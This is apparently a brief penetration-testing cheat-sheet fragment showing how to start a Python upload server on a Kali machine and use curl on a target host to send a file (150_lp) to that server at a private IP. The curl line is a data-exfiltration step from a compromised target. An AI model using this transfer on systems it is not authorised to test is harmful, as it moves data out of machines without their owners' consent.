Start the server on Kali
```bash
python -m uploadserver
```

Upload from target to Kali
```bash
curl -X POST http://192.168.100.200:8000/upload -F 'files=@150_lp'
```
